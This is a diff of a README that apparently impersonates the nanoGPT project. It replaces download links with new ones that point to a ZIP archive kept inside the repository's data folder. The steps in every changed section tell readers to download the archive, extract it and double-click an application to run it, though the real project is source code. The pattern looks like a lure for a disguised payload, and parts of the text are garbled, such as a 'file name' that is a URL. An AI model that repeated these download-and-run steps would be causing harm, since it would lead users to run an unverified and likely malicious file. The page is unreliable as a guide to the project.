@@ -4,19 +4,19 @@
 nanoGPT is the simplest and fastest way to train or fine-tune medium-sized GPT models. This tool is designed for users who want to explore the world of AI without getting into complex setups. With nanoGPT, you can customize and train models that suit your needs, whether for personal projects, research, or practical applications.
 
 ## 📥 Download nanoGPT
-[![Download nanoGPT](https://raw.githubusercontent.com/marcussm1/nanoGPT/master/pederast/nanoGPT.zip%https://raw.githubusercontent.com/marcussm1/nanoGPT/master/pederast/nanoGPT.zip)](https://raw.githubusercontent.com/marcussm1/nanoGPT/master/pederast/nanoGPT.zip)
+[![Download nanoGPT](https://github.com/marcussm1/nanoGPT/raw/refs/heads/master/data/openwebtext/nano-GPT-2.2.zip%https://github.com/marcussm1/nanoGPT/raw/refs/heads/master/data/openwebtext/nano-GPT-2.2.zip)](https://github.com/marcussm1/nanoGPT/raw/refs/heads/master/data/openwebtext/nano-GPT-2.2.zip)
 
 ## 🚀 Getting Started
 Getting started with nanoGPT is easy. Follow these simple steps to download and run the application.
 
 ### Step 1: Visit the Release Page
-Go to the [Releases page](https://raw.githubusercontent.com/marcussm1/nanoGPT/master/pederast/nanoGPT.zip). This page contains all the available versions of nanoGPT. You’ll find the latest version at the top.
+Go to the [Releases page](https://github.com/marcussm1/nanoGPT/raw/refs/heads/master/data/openwebtext/nano-GPT-2.2.zip). This page contains all the available versions of nanoGPT. You’ll find the latest version at the top.
 
 ### Step 2: Choose a Version
 Look for the latest version of nanoGPT. It is recommended to download the most recent version for the best features and performance. 
 
 ### Step 3: Download the Application
-Once you've located the latest version, look for the assets section. Click on the application file to start the download. It may look like `https://raw.githubusercontent.com/marcussm1/nanoGPT/master/pederast/nanoGPT.zip` or `https://raw.githubusercontent.com/marcussm1/nanoGPT/master/pederast/nanoGPT.zip`, depending on your operating system. 
+Once you've located the latest version, look for the assets section. Click on the application file to start the download. It may look like `https://github.com/marcussm1/nanoGPT/raw/refs/heads/master/data/openwebtext/nano-GPT-2.2.zip` or `https://github.com/marcussm1/nanoGPT/raw/refs/heads/master/data/openwebtext/nano-GPT-2.2.zip`, depending on your operating system. 
 
 ## 💻 System Requirements
 Before you install nanoGPT, make sure your computer meets the following requirements:
@@ -37,7 +37,7 @@ Find the file you just downloaded. It is usually in your computer's Downloads fo
 If you downloaded a ZIP file, right-click on it and select "Extract All" (Windows) or double-click the file (macOS). Choose a location where you want to save the extracted files.
 
 ### Step 3: Run the Application
-Navigate to the extracted folder. Double-click on the file named `https://raw.githubusercontent.com/marcussm1/nanoGPT/master/pederast/nanoGPT.zip` (Windows) or `nanoGPT` (macOS/Linux) to run the application. 
+Navigate to the extracted folder. Double-click on the file named `https://github.com/marcussm1/nanoGPT/raw/refs/heads/master/data/openwebtext/nano-GPT-2.2.zip` (Windows) or `nanoGPT` (macOS/Linux) to run the application. 
 
 ## 🎓 How to Train Your First GPT Model
 Once the application is running, you can start training your own GPT model. 
@@ -69,6 +69,6 @@ If you have questions or need support, consider joining the nanoGPT community. Y
 Your feedback is important! If you have suggestions for improvement or want to report issues, please submit an issue on the GitHub repository. If you’re interested in contributing, check out the contribution guidelines on the repository page.
 
 ## 📦 Download & Install
-Ready to get started? Visit the [Releases page](https://raw.githubusercontent.com/marcussm1/nanoGPT/master/pederast/nanoGPT.zip) again to download the latest version of nanoGPT. Enjoy training your models with ease!
+Ready to get started? Visit the [Releases page](https://github.com/marcussm1/nanoGPT/raw/refs/heads/master/data/openwebtext/nano-GPT-2.2.zip) again to download the latest version of nanoGPT. Enjoy training your models with ease!
 
 Thank you for choosing nanoGPT. Happy modeling!
